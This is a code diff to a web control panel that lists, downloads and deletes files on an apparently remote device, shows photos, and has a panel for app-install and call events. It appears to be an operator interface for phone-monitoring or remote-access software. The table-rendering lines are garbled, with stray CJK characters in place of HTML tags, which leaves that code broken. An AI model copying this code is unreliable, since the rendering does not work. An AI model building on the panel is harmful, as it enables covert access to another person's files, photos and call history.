@@ -314,17 +314,34 @@
             gap: 12px;
         }
 
-        .file-path {
-            background: #f0f2f5;
-            padding: 6px 14px;
-            border-radius: 6px;
+        .file-toolbar {
+            display: flex;
+            gap: 12px;
+        }
+
+        .file-toolbar button {
+            width: auto;
+            margin: 0;
+            padding: 8px 16px;
             font-size: 13px;
-            font-family: monospace;
-            color: #2c3e50;
-            flex: 1;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
+            text-align: center;
+            justify-content: center;
+        }
+
+        .file-toolbar .delete-btn {
+            background: #d32f2f;
+            color: white;
+            border: none;
+        }
+
+        .file-toolbar .delete-btn:hover {
+            background: #b71c1c;
+        }
+
+        .file-toolbar .download-btn {
+            background: #1976ff;
+            color: white;
+            border: none;
         }
 
         .tree-content {
@@ -396,6 +413,13 @@
             font-size: 11px;
             color: #94a3b8;
             margin-left: 10px;
+        }
+
+        .file-checkbox {
+            width: 16px;
+            height: 16px;
+            margin-right: 10px;
+            cursor: pointer;
         }
 
         /* ==================== PAGINATION ==================== */
@@ -1541,9 +1565,9 @@
         const pageSize = 20, total = Math.ceil(rows.length/pageSize);
         const start = currentPage*pageSize;
         const pageRows = rows.slice(start, start+pageSize);
-        let html = '<table><thead>士' + headers.map(h=>`<th>${h}</th>`).join('') + '?</thead><tbody>';
-        pageRows.forEach(r => { html += '<tr>' + r.map(cell=>`<td>${cell||''}</td>`).join('') + '处'; });
-        html += '</tbody>麣';
+        let html = '能够<thead>‘ + headers.map(h=>`<th>${h}</th>`).join('') + '?</thead><tbody>';
+        pageRows.forEach(r => { html += '?' + r.map(cell=>`<td>${cell||''}</td>`).join('') + '处'; });
+        html += '</tbody>?</table>';
         if (total>1) {
             html += '<div class="pagination">';
             for (let i=0; i<total; i++) html += `<button class="page-btn" onclick="gotoPage(${i})">${i+1}</button>`;
@@ -1554,16 +1578,22 @@
 
     function gotoPage(p) { currentPage = p; renderTable(); }
 
+    // File Manager: sorted, with toolbar buttons and no path display
     function renderFiles() {
         const panel = document.getElementById('main-panel');
         if (!panel) return;
+
+        // Sort data: folders first (alphabetically), then files (alphabetically)
+        const folders = currentData.filter(i => i.isDir).sort((a,b) => a.name.localeCompare(b.name));
+        const files = currentData.filter(i => !i.isDir).sort((a,b) => a.name.localeCompare(b.name));
 
         let html = `
             <div class="file-manager">
                 <div class="file-toolbar-sticky">
                     <div class="file-toolbar">
-                        <button onclick="navigateUp()">⬆ Back</button>
-                        <span class="file-path">${currentPath}</span>
+                        <button onclick="navigateUp()" class="up-btn">⬆ Up</button>
+                        <button onclick="downloadSelected()" class="download-btn">⬇️ Download (<span id="downloadCount">${selectedFiles.length}</span>)</button>
+                        <button onclick="deleteSelected()" class="delete-btn">🗑️ Delete (<span id="deleteCount">${selectedFiles.length}</span>)</button>
                     </div>
                 </div>
                 <div class="tree-content">
@@ -1571,27 +1601,35 @@
         `;
 
         // Folders
-        currentData.filter(i => i.isDir).forEach(f => {
+        folders.forEach(f => {
             html += `
                 <li class="tree-item">
-                    <div class="folder-header" onclick="handleFolderClick('${f.path}')">
+                    <div class="folder-header" onclick="handleFolderClick('${escapeHtml(f.path)}')">
                         <span class="folder-icon">📁</span>
-                        <span class="item-name">${f.name}</span>
+                        <span class="item-name">${escapeHtml(f.name)}</span>
                     </div>
                 </li>`;
         });
 
-        // Files
-        currentData.filter(i => !i.isDir).forEach(f => {
+        // Files (with checkboxes for selection)
+        files.forEach(f => {
+            const path = f.path;
+            const name = f.name;
+            const size = formatBytes(f.size);
             html += `
                 <li class="tree-item">
                     <div class="file-row">
-                        <span class="folder-icon">📄</span>
-                        <span class="item-name">${f.name}</span>
-                        <span class="file-size">${formatBytes(f.size)}</span>
+                        <input type="checkbox" class="file-checkbox" data-path="${escapeHtml(path)}" onchange="updateSelected(this)">
+                        <span class="file-icon">📄</span>
+                        <span class="item-name">${escapeHtml(name)}</span>
+                        <span class="file-size">${size}</span>
                     </div>
                 </li>`;
         });
+
+        if (folders.length === 0 && files.length === 0) {
+            html += `<li><div style="padding:20px; color:#999;">No files or folders</div></li>`;
+        }
 
         html += `</ul></div></div>`;
         panel.innerHTML = html;
@@ -1606,21 +1644,30 @@
         currentPath = parent;
         sendCommand('LIST_FILES', { path: parent });
     }
+
     function updateSelected(checkbox) {
         const path = checkbox.dataset.path;
-        if (checkbox.checked) { if (!selectedFiles.includes(path)) selectedFiles.push(path); }
-        else { selectedFiles = selectedFiles.filter(p=>p!==path); }
+        if (checkbox.checked) {
+            if (!selectedFiles.includes(path)) selectedFiles.push(path);
+        } else {
+            selectedFiles = selectedFiles.filter(p => p !== path);
+        }
         updateCounters();
     }
+
     function updateCounters() {
         const cnt = selectedFiles.length;
-        document.getElementById('downloadCount').innerText = cnt;
-        document.getElementById('deleteCount').innerText = cnt;
+        const downloadSpan = document.getElementById('downloadCount');
+        const deleteSpan = document.getElementById('deleteCount');
+        if (downloadSpan) downloadSpan.innerText = cnt;
+        if (deleteSpan) deleteSpan.innerText = cnt;
     }
+
     function downloadSelected() {
         if (!selectedFiles.length) return alert('No files selected');
         selectedFiles.forEach(p => sendPlainText('dl ' + p));
     }
+
     function deleteSelected() {
         if (!selectedFiles.length) return alert('No files selected');
         if (!confirm(`Delete ${selectedFiles.length} file(s)? This cannot be undone.`)) return;
@@ -1840,6 +1887,8 @@
             grid.appendChild(tile);
         });
     }
+
+    function showFullImage(b64, mediaId) { downloadBase64(b64, `photo_${mediaId||Date.now()}.jpg`); }
 
     function showAppEventsPanel() {
         panel.innerHTML = '<h3>📦 App & Call Events</h3><p>App installs/removals and call events.</p><div><button data-days="1">Today</button><button data-days="3">3 Days</button><button data-days="5">5 Days</button></div><div id="appEventsList"></div>';
